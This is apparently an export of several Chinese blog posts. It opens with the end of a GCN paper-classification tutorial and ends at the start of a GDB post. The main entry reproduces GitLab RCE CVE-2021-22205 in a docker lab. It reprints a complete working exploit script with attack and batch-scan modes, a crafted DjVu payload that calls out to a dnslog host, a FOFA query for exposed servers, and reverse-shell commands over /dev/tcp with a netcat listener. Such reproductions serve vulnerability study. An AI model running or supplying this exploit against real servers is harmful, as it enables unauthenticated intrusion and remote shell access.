表示将模型转变为evaluation（测试）模式，这样就可以排除BN和Dropout对测试的干扰</span><br><span class="line">    </span><br><span class="line">    with torch.no_grad():  # 显著减少显存占用</span><br><span class="line">        logits = model(tensor_adjacency, tensor_x) #(N,16)-&gt;(N,7) N节点数</span><br><span class="line">        test_mask_logits = logits[mask]  # 矩阵形状和mask一样</span><br><span class="line">        </span><br><span class="line">        predict_y = test_mask_logits.max(1)[1]  # 返回每一行的最大值中索引（返回最大元素在各行的列索引）</span><br><span class="line">        accuarcy = torch.eq(predict_y, tensor_y[mask]).float().mean()</span><br><span class="line">    return accuarcy, test_mask_logits.cpu().numpy(), tensor_y[mask].cpu().numpy()</span><br></pre></td></tr></table></figure>

<p>使用上面代码进行模型训练，并对其进行日志输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loss, val_acc = train()</span><br><span class="line">test_acc, test_logits, test_label = test(tensor_test_mask)</span><br><span class="line">print(&quot;Test accuarcy: &quot;, test_acc.item())#item()返回的是一个浮点型数据，测试集准确率</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231124160734838.png" class title="image-20231124160734838">

<h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h3><p>损失函数用来测度模型的输出值和真实因变量之间的差异</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def plot_loss_with_acc(loss_history, val_acc_history):</span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    # 坐标系ax1画曲线1</span><br><span class="line">    ax1 = fig.add_subplot(111)  # 指的是将plot界面分成1行1列，此子图占据从左到右从上到下的1位置</span><br><span class="line">    ax1.plot(range(len(loss_history)), loss_history,</span><br><span class="line">             c=np.array([255, 71, 90]) / 255.)  # c为颜色</span><br><span class="line">    plt.ylabel(&#x27;Loss&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 坐标系ax2画曲线2</span><br><span class="line">    ax2 = fig.add_subplot(111, sharex=ax1, frameon=False)  # 其本质就是添加坐标系，设置共享ax1的x轴，ax2背景透明</span><br><span class="line">    ax2.plot(range(len(val_acc_history)), val_acc_history,</span><br><span class="line">             c=np.array([79, 179, 255]) / 255.)</span><br><span class="line">    ax2.yaxis.tick_right()  # 开启右边的y坐标</span><br><span class="line">    </span><br><span class="line">    ax2.yaxis.set_label_position(&quot;right&quot;)</span><br><span class="line">    plt.ylabel(&#x27;ValAcc&#x27;)</span><br><span class="line">    </span><br><span class="line">    plt.xlabel(&#x27;Epoch&#x27;)</span><br><span class="line">    plt.title(&#x27;Training Loss &amp; Validation Accuracy&#x27;)</span><br><span class="line">    plt.show()</span><br><span class="line"> </span><br><span class="line">plot_loss_with_acc(loss, val_acc)</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231124161125193.png" class title="image-20231124161125193">

<p><strong>红线代表的损失值随着训练次数的增加越来越小，蓝线代表的模型准确率越来越高</strong></p>
<p>将最后一层得到的输出进行TSNE降维，将多维数据映射到人类观察的多个维度中，得到如下图的分类结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.manifold import TSNE</span><br><span class="line">tsne = TSNE()</span><br><span class="line">out = tsne.fit_transform(test_logits)</span><br><span class="line">fig = plt.figure()</span><br><span class="line">for i in range(7):</span><br><span class="line">    indices = test_label == i</span><br><span class="line">    x, y = out[indices].T</span><br><span class="line">    plt.scatter(x, y, label=str(i))</span><br><span class="line">plt.legend()</span><br></pre></td></tr></table></figure>

<p>绘制测试数据的TSNE降维图</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231124162914882.png" class title="image-20231124162914882">

<p>可以看到成功将论文集划分为鲜明的7类</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>神经网络</category>
      </categories>
      <tags>
        <tag>-GCN -论文分类</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</title>
    <url>/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/</url>
    <content><![CDATA[<h1 id="Gitlab未授权命令执行漏洞复现-CVE-2021-22205"><a href="#Gitlab未授权命令执行漏洞复现-CVE-2021-22205" class="headerlink" title="Gitlab未授权命令执行漏洞复现(CVE-2021-22205)"></a>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</h1><hr>
<p>GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web服务</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>2021年10月28日，GitLab远程命令执行漏洞（CVE-2021-22205）在野利用工具被公开，这意味着黑客可直接利用该攻击代码实施入侵攻击。具体而言，GitLab某些端点的路径存在无需授权风险，攻击者可在无需认证的情况下完成图片上传，并利用该漏洞构造恶意数据执行远程命令，最终造成服务器敏感信息泄露或执行任意命令。该漏洞CVSS3.0评分9.9分，定级为严重漏洞。</p>
<h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><hr>
<p>11.9 &lt;&#x3D; Gitlab &lt;&#x3D; 13.8.7<br>13.9 &lt;&#x3D; Gitlab &lt;&#x3D; 13.9.5<br>13.10 &lt;&#x3D; Gitlab &lt;&#x3D; 13.10.2</p>
<p>P.S. 本文复现版本：<br>Gitlab CE 13.10.2</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
<p>使用docker拉取项目资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull gitlab/gitlab-ce:13.10.2-ce.0</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116172551874.png" class title="image-20211116172551874">



<p>启动Gitlab漏洞环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 9980:80 -p 9922:22  -v /usr/local/gitlab-test/etc:/etc/gitlab -v /usr/local/gitlab-test/log:/var/log/gitlab -v /usr/local/gitlab-test/opt:/var/opt/gitlab--restart always --privileged=true --name gitlab-test gitlab/gitlab-ce:13.10.2-ce.0</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116173041136.png" class title="image-20211116173041136">



<p>使用Docker ps查看正在运行进程</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117194141133.png" class title="image-20211117194141133">



<p>在浏览器上访问9980端口，可以看到访问Gitlab服务器成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116173609502.png" class title="image-20211116173609502">



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><hr>
<p>搜索引擎查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Title=&quot;GitLab&quot; &amp;&amp; country=&quot;CN&quot;</span><br></pre></td></tr></table></figure>



<p>漏洞POC&#x2F;EXP:</p>
<p>转自:<a href="https://github.com/Al1ex/CVE-2021-22205">Al1ex&#x2F;CVE-2021-22205: CVE-2021-22205&amp; GitLab CE&#x2F;EE RCE (github.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	  ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  </span></span><br><span class="line"><span class="string">	 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| </span></span><br><span class="line"><span class="string">	| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ </span></span><br><span class="line"><span class="string">	| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |</span></span><br><span class="line"><span class="string"> 	\____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 	                                Author:Al1ex@Heptagram</span></span><br><span class="line"><span class="string">                                Github:https://github.com/Al1ex                             </span></span><br><span class="line"><span class="string">    	&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        验证模式：python CVE-2021-22205.py -v true -t target_url </span></span><br><span class="line"><span class="string">        攻击模式：python CVE-2021-22205.py -a true -t target_url -c command </span></span><br><span class="line"><span class="string">        批量检测：python CVE-2021-22205.py -s true -f file </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = session.get(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/users/sign_in&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        soup = BeautifulSoup(req1.text, features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">&#x27;meta&#x27;</span>)[<span class="number">16</span>].get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">        data = <span class="string">&quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-CSRF-Token&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;token&#125;</span>&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>&#125;</span><br><span class="line">        flag = <span class="string">&#x27;Failed to process image&#x27;</span></span><br><span class="line">        req2 = session.post(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/uploads/user&quot;</span>, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> req2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 目标 &#123;&#125; 存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 目标 &#123;&#125; 不存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">target_url,command</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = session.get(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/users/sign_in&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        soup = BeautifulSoup(req1.text, features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">&#x27;meta&#x27;</span>)[<span class="number">16</span>].get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">        data = <span class="string">&quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx&#123;&quot;</span>+  command +<span class="string">&quot;&#125; . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-CSRF-Token&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;token&#125;</span>&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>&#125;</span><br><span class="line">        flag = <span class="string">&#x27;Failed to process image&#x27;</span></span><br><span class="line">        req2 = session.post(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/uploads/user&quot;</span>, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> req2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 目标 &#123;&#125; 存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 请到dnslog或主机检查执行结果&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 目标 &#123;&#125; 不存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">file</span>):</span></span><br><span class="line">    <span class="keyword">for</span> url_link <span class="keyword">in</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> url_link.strip() != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                url_path = format_url(url_link.strip())</span><br><span class="line">                check(url_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">&quot;http&quot;</span>:</span><br><span class="line">            url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">            url = url.strip()</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;URL 错误 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(url))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;GitLab &lt; 13.10.3 RCE&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--verify&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>,<span class="built_in">help</span>=<span class="string">&#x27; 验证模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 目标URL &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--attack&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, <span class="built_in">help</span>=<span class="string">&#x27; 攻击模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 执行命令 &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--scan&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, <span class="built_in">help</span>=<span class="string">&#x27; 批量模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 文件路径 &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    verify_model = args.verify</span><br><span class="line">    target_url   = args.target</span><br><span class="line"></span><br><span class="line">    attack_model = args.attack</span><br><span class="line">    command = args.command</span><br><span class="line"></span><br><span class="line">    scan_model = args.scan</span><br><span class="line">    file = args.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verify_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> target_url !=<span class="literal">None</span>:</span><br><span class="line">        check(target_url)</span><br><span class="line">    <span class="keyword">elif</span> attack_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> target_url != <span class="literal">None</span> <span class="keyword">and</span> command != <span class="literal">None</span>:</span><br><span class="line">        attack(target_url,command)</span><br><span class="line">    <span class="keyword">elif</span> scan_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> file != <span class="literal">None</span>:</span><br><span class="line">        scan(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行页面如下:</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117190708830.png" class title="image-20211117190708830">



<p>选项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证模式：python CVE-2021-22205.py -v true -t target_url</span><br><span class="line">攻击模式：python CVE-2021-22205.py -a true -t target_url -c command</span><br><span class="line">批量检测：python CVE-2021-22205.py -s true -f file</span><br></pre></td></tr></table></figure>



<p>对搭建环境进行漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -v true -t http://192.168.211.129:9980</span><br></pre></td></tr></table></figure>

<p>可以看到该Gitlab存在漏洞</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117194704856.png" class title="image-20211117194704856">



<h3 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h3><p>下面对该漏洞进行利用，这里使用Dnslog解析来验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;curl qnfjxb.dnslog.cn&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117195844747.png" class title="image-20211117195844747">



<p>可以看到在Dnslog平台上看到请求的解析记录，验证漏洞成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117195659211.png" class title="image-20211117195659211">



<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><br><span class="line">//这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下</span><br><span class="line"></span><br><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;chmod +x /tmp/1.sh&quot;</span><br><span class="line">//这条语句意思是代表，对写入成功的sh脚本加执行权限</span><br><span class="line"></span><br><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;/bin/bash /tmp/1.sh&quot;</span><br><span class="line">//这句话的意思是执行该脚本</span><br></pre></td></tr></table></figure>



<p>首先将反弹shell命令写入到系统文件中，如下图:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.233.1/12345 0&gt;&amp;1&#x27; &gt; /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200315406.png" class title="image-20211117200315406">



<p>可以看到shell.sh写入服务器成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200622194.png" class title="image-20211117200622194">



<p>然后再个写入的脚本赋予执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;chmod +x /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200912543.png" class title="image-20211117200912543">



<p>可以看到shell.sh有了执行权限</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200901243.png" class title="image-20211117200901243">



<p>最后就是运行该脚本反弹shell,首先使用netcat监听本地12345端口，等待连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201549545.png" class title="image-20211117201549545">



<p>运行shell.sh脚本反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;/bin/bash /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201646293.png" class title="image-20211117201646293">



<p>反弹shell成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201527660.png" class title="image-20211117201527660">





<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1、及时升级GitLab至最新安全版本</p>
<p>2、配置访问控制策略，避免受影响的GitLab暴露在公网</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Gitlab</category>
      </categories>
      <tags>
        <tag>-web漏洞 - Gitlab -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB调试使用</title>
    <url>/2022/01/23/GDB%E8%B0%83%E8%AF%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="GDB调试使用"><a href="#GDB调试使用" class="headerlink" title="GDB调试使用"></a>GDB调试使用</h1><p>代码环境如下</p>
